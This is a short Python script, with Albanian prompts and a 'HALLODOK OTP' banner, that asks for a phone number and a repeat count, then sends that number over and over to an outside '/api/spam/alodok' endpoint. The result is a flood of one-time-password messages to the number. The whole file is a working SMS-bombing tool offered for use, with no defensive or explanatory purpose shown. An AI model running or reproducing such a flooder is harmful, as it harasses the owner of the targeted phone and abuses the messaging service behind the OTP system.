import requests, time

print("""
	[ HALLODOK OTP ]
	    -scone -
""")

num=input("[In] Numri: ")
jum=int(input("[In] Shuma: "))

print("\n[RESULT]")
for x in range(jum):
	try:
		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
			data={"numri":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Ishte e sukseshme {num}")
		else:
			print(f"{x+1}. Gaboi {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")
